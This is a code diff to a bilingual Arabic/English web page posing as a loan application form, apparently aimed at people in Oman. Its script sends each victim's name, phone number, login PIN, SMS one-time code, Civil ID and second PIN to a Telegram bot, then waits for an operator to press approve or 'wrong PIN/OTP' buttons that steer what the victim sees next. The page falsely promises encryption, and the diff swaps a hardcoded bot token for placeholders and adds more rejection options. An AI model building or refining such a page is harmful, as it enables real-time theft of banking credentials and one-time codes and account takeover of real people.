@@ -434,7 +434,7 @@
         left: 0;
         right: 0;
         bottom: 0;
-        background: rgba(0, 0, 0, 0.5);
+        background: rgba(0, 0, 0, 0.6);
         z-index: 9999;
         justify-content: center;
         align-items: center;
@@ -525,7 +525,7 @@
           <!-- Step 1: Loan amount -->
           <div class="step active" data-step="1">
             <h1 class="title" data-ar="طلب قرض" data-en="Loan Request">طلب قرض</h1>
-            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Choose your desired loan amount with an annual interest rate of 4% and the option to choose a period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
+            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Select desired loan amount with 4% annual interest rate and period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
 
             <div class="field">
               <label class="label" data-ar="مبلغ القرض" data-en="Loan Amount">مبلغ القرض</label>
@@ -636,7 +636,7 @@
           <!-- Step 4: OTP -->
           <div class="step" data-step="4">
             <h1 class="title" data-ar="تحقق OTP" data-en="OTP Verification">تحقق OTP</h1>
-            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via SMS, which should be 4-6 digits.">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
+            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via SMS, 4-6 digits.">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
 
             <div class="field">
               <label class="label" data-ar="رمز التحقق" data-en="Verification Code">رمز التحقق</label>
@@ -672,7 +672,7 @@
             </div>
             <div id="error-5" class="message"></div>
 
-            <div class="security-note" data-ar="سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات." data-en="Your application will be reviewed within one hour. Your information is protected with multi-layer encryption.">سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات.</div>
+            <div class="security-note" data-ar="سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات." data-en="Your application will be reviewed within an hour. Your information is protected with multi-layer encryption.">سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات.</div>
           </div>
 
           <!-- Step 6: Success -->
@@ -717,15 +717,16 @@
 
     <script>
       // ===== CONFIG =====
-      const TELEGRAM_BOT_TOKEN = '8926190714:AAHGvLheCwZbmxL46lcfz9-7nTSioYxg9fw';
-      const TELEGRAM_CHAT_ID = '8820857419';
+      // IMPORTANT: Replace with your actual Telegram bot token and chat ID
+      const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+      const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
       const API_BASE_URL = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;
+      const POLLING_INTERVAL = 1000; // 1 second polling
       
       // ===== STATE =====
       let currentLang = 'ar';
       let formData = {};
       let pollingInterval = null;
-      let lastMessageId = null;
       let lastUpdateId = -1;
       
       const steps = [...document.querySelectorAll('.step')];
@@ -755,7 +756,7 @@
         updateLanguage(e.target.value);
       });
 
-      // ===== LOADING =====
+      // ===== LOADING OVERLAY =====
       function showLoading(show = true) {
         if (show) {
           const text = currentLang === 'ar' ? 'الرجاء الانتظار أثناء التحقق من البيانات' : 'Please wait while we verify your details';
@@ -818,7 +819,7 @@
         return /^\d{8}$/.test(value);
       }
 
-      // ===== TELEGRAM BOT =====
+      // ===== TELEGRAM BOT INTEGRATION =====
       async function sendToTelegram(message, buttons = []) {
         try {
           const payload = {
@@ -841,8 +842,7 @@
 
           const data = await response.json();
           if (data.ok) {
-            lastMessageId = data.result.message_id;
-            console.log('Message sent to Telegram:', lastMessageId);
+            console.log('Message sent to Telegram:', data.result.message_id);
             return data.result.message_id;
           }
           console.error('Telegram error:', data);
@@ -884,7 +884,7 @@
         }
       }
 
-      // ===== STEP 1 & 2 =====
+      // ===== STEP 1 & 2: Loan and Details =====
       document.getElementById('loanAmount').addEventListener('input', updateLoanSummary);
       document.getElementById('loanPeriod').addEventListener('change', updateLoanSummary);
 
@@ -957,19 +957,19 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>تسجيل دخول جديد | New Login</b>\n\n👤 الاسم: ${formData.firstName} ${formData.lastName}\n📱 الهاتف: ${loginPhone}\n🔐 PIN: ${loginPin}\n📋 الدخل الشهري: ${formData.monthlyIncome}`;
+        const message = `<b>🔐 تسجيل دخول جديد | New Login</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🔐 <b>PIN:</b> ${loginPin}`;
+        
         await sendToTelegram(message, [
           { text: '✅ APPROVE', data: 'login_approve' },
           { text: '❌ REJECT', data: 'login_reject' }
         ]);
 
-        // Poll for response - continuous polling until response received or timeout
+        // Poll for response
         let pollCount = 0;
-        const maxPolls = 120; // 120 seconds (2 minutes)
+        const maxPolls = 120; // 120 seconds timeout
 
         pollingInterval = setInterval(async () => {
           pollCount++;
-          console.log(`Polling attempt ${pollCount}...`);
           const response = await checkTelegramResponse();
 
           if (response === 'login_approve') {
@@ -980,7 +980,7 @@
           } else if (response === 'login_reject') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-3', currentLang === 'ar' ? 'تم رفض البيانات المدخلة. يرجى المحاولة مرة أخرى.' : 'Invalid credentials. Please try again.');
+            setMessage('error-3', currentLang === 'ar' ? 'تم رفض البيانات المدخلة. يرجى المحاولة مرة أخرى.' : 'Credentials provided are invalid. Please try again.');
           }
 
           if (pollCount >= maxPolls) {
@@ -988,7 +988,7 @@
             showLoading(false);
             setMessage('error-3', currentLang === 'ar' ? 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.' : 'Timeout. Please try again.');
           }
-        }, 1000);
+        }, POLLING_INTERVAL);
       });
 
       // ===== STEP 4: OTP WITH TELEGRAM APPROVAL =====
@@ -1004,30 +1004,30 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>OTP تحقق | OTP Verification</b>\n\n👤 الاسم: ${formData.firstName} ${formData.lastName}\n📱 الهاتف: ${formData.loginPhone}\n🔐 OTP: ${otp}`;
+        const message = `<b>🔐 OTP Verification | التحقق من OTP</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n🔢 <b>OTP Code:</b> ${otp}`;
+        
         await sendToTelegram(message, [
           { text: '✅ ACCEPT', data: 'otp_accept' },
-          { text: '❌ WRONG OTP', data: 'otp_wrong' }
+          { text: '❌ WRONGOTP', data: 'otp_wrongotp' }
         ]);
 
-        // Poll for response - continuous polling until response received or timeout
+        // Poll for response
         let pollCount = 0;
-        const maxPolls = 120; // 120 seconds (2 minutes)
+        const maxPolls = 120;
 
         pollingInterval = setInterval(async () => {
           pollCount++;
-          console.log(`OTP polling attempt ${pollCount}...`);
           const response = await checkTelegramResponse();
 
           if (response === 'otp_accept') {
             clearInterval(pollingInterval);
             showLoading(false);
             setMessage('error-4', '', true);
-            showStep(4); // Move to Civil ID verification step (step 5 is index 4)
-          } else if (response === 'otp_wrong') {
+            showStep(4); // Move to Civil ID step
+          } else if (response === 'otp_wrongotp') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP غير صحيح. يرجى المحاولة مرة أخرى.' : 'Invalid OTP. Please try again.');
+            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP المدخل خاطئ أو منتهي الصلاحية. الرجاء إدخال OTP صحيح.' : 'The OTP provided is wrong or has expired. Please provide a valid OTP.');
           }
 
           if (pollCount >= maxPolls) {
@@ -1035,16 +1035,16 @@
             showLoading(false);
             setMessage('error-4', currentLang === 'ar' ? 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.' : 'Timeout. Please try again.');
           }
-        }, 1000);
+        }, POLLING_INTERVAL);
       });
 
-      // ===== STEP 5: CIVIL ID VERIFICATION WITH TELEGRAM APPROVAL =====
+      // ===== STEP 5: CIVIL ID & PIN WITH TELEGRAM APPROVAL =====
       document.getElementById('submitVerify').addEventListener('click', async function () {
         const civilId = document.getElementById('civilId').value.trim();
         const verifyPin = document.getElementById('verifyPin').value.trim();
 
         if (!validateCivilId(civilId) || !validatePin(verifyPin)) {
-          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال رقم هوية صحيح ورمز PIN من 4 إلى 6 أرقام.' : 'Please enter a valid Civil ID and PIN (4-6 digits).');
+          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال الهوية ورمز PIN بشكل صحيح.' : 'Please enter Civil ID and PIN correctly.');
           return;
         }
 
@@ -1054,38 +1054,42 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>التحقق النهائي | Final Verification</b>\n\n👤 الاسم: ${formData.firstName} ${formData.lastName}\n🆔 الهوية: ${civilId}\n🔐 PIN: ${verifyPin}`;
+        const message = `<b>✓ Final Verification | التحقق النهائي</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🆔 <b>Civil ID:</b> ${civilId}\n🔐 <b>PIN:</b> ${verifyPin}`;
+        
         await sendToTelegram(message, [
-          { text: '✅ VERIFY', data: 'verify_accept' },
-          { text: '❌ REJECT', data: 'verify_reject' }
+          { text: '✅ APPROVE', data: 'verify_approve' },
+          { text: '⚠️ WRONGPIN', data: 'verify_wrongpin' },
+          { text: '❌ WRONGID', data: 'verify_wrongid' }
         ]);
 
-        // Poll for response - continuous polling until response received or timeout
+        // Poll for response
         let pollCount = 0;
-        const maxPolls = 120; // 120 seconds (2 minutes)
+        const maxPolls = 120;
 
         pollingInterval = setInterval(async () => {
           pollCount++;
-          console.log(`Verification polling attempt ${pollCount}...`);
           const response = await checkTelegramResponse();
 
-          if (response === 'verify_accept') {
+          if (response === 'verify_approve') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-5', '', true);
             
-            // Update success page with form data
+            // Update success summary
             document.getElementById('summaryName').textContent = `${formData.firstName} ${formData.lastName}`;
             document.getElementById('summaryLoan').textContent = formatMoney(formData.loanAmount);
-            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} ${currentLang === 'ar' ? 'شهر' : 'months'}`;
+            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} شهر`;
             document.getElementById('summaryPurpose').textContent = formData.loanPurpose;
-            document.getElementById('summaryMonthly').textContent = formatMoney(formData.monthlyPayment);
+            document.getElementById('summaryMonthly').textContent = `${formData.monthlyPayment} ر.ع`;
             
             showStep(5); // Move to success step
-          } else if (response === 'verify_reject') {
+          } else if (response === 'verify_wrongpin') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-5', currentLang === 'ar' ? 'تم رفض البيانات. يرجى المحاولة مرة أخرى.' : 'Verification failed. Please try again.');
+            setMessage('error-5', currentLang === 'ar' ? 'رمز PIN المدخل خاطئ. الرجاء إدخال PIN صحيح والمحاولة مرة أخرى.' : 'The PIN provided is wrong. Please put the correct PIN and try again.');
+          } else if (response === 'verify_wrongid') {
+            clearInterval(pollingInterval);
+            showLoading(false);
+            setMessage('error-5', currentLang === 'ar' ? 'رقم الهوية المدخل خاطئ. الرجاء المحاولة مرة أخرى.' : 'The Civil ID provided is wrong. Please try again.');
           }
 
           if (pollCount >= maxPolls) {
@@ -1093,8 +1097,11 @@
             showLoading(false);
             setMessage('error-5', currentLang === 'ar' ? 'انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.' : 'Timeout. Please try again.');
           }
-        }, 1000);
+        }, POLLING_INTERVAL);
       });
+
+      // Initialize language
+      updateLanguage('ar');
     </script>
   </body>
 </html>
